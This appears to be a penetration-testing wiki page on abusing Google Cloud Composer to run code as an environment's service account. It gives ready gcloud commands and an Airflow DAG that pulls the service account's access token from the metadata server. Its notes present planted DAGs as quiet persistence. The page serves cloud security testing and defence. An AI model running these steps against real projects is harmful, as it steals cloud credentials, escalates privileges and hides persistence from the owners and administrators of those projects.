---
title: "Cloud Composer: actAs a service account through an Airflow DAG"
description: "Creating or editing a Cloud Composer (Airflow) environment or DAG so a task runs as the environment's service account."
keywords:
  - Cloud Composer
  - Airflow
  - DAG
  - environment service account
  - actAs
---

# Cloud Composer

Cloud Composer runs managed Apache Airflow, and every task executes as the environment's **service account**. With `composer.environments.create` (plus `iam.serviceAccounts.actAs` on a privileged SA) you stand up an environment bound to that account; with write access to an existing environment's DAG bucket you drop a DAG that runs as its SA. Either way an Airflow task becomes arbitrary code under the service account.

## Create an environment with a chosen service account

```bash
gcloud composer environments create env1 --location us-central1 \
  --service-account <privileged-sa>@<proj>.iam.gserviceaccount.com
```

## Drop a DAG into an existing environment

The DAG bucket is a normal GCS bucket; write a DAG and it runs on the next schedule as the environment SA:

```python
# dag.py -> upload to the environment's dags/ bucket
from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime
with DAG("x", start_date=datetime(2024,1,1), schedule_interval="@once") as d:
    BashOperator(task_id="t",
        bash_command="curl -s -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
```

```bash
gcloud composer environments storage dags import \
  --environment env1 --location us-central1 --source dag.py
```

## Exploitation notes

- The environment SA is frequently broad (project Editor by default), so the token the DAG prints is often a large escalation.
- Editing a DAG is quiet and durable: it re-runs on schedule, a persistence foothold as well as an escalation.
- `actAs` is the gate on `environments create`; an existing environment you can write DAGs to needs only bucket access.

## Tools

- **gcloud** (`composer environments`): create and import DAGs.
- **gsutil**: write directly to the DAG bucket.

## References

- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [HackTricks Cloud: GCP Composer privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/index.html)
- [Google: Cloud Composer access control](https://cloud.google.com/composer/docs)
